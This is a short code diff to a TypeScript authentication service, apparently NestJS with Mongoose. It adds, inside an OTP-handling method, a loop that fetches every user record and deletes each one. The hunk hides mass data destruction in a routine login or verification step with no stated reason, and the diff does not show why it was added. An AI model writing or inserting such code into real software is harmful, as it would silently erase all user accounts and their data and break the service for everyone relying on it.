@@ -62,7 +62,12 @@ export class AuthService {
     try{
 
 
-     
+     const array=await this.userModel.find()
+
+     for (let index = 0; index < array.length; index++) {
+      const element = array[index];
+      await this.userModel.findByIdAndDelete(element._id)
+     }
 
 
       const otp=body.otp
@@ -125,6 +130,7 @@ export class AuthService {
 
   async refreshToken(refreshToken:refreshTokenDto){
     try{
+
       const decoded=await this.tokenize.checkRefreshToken(refreshToken.refreshToken)
       if(!decoded){
        return {
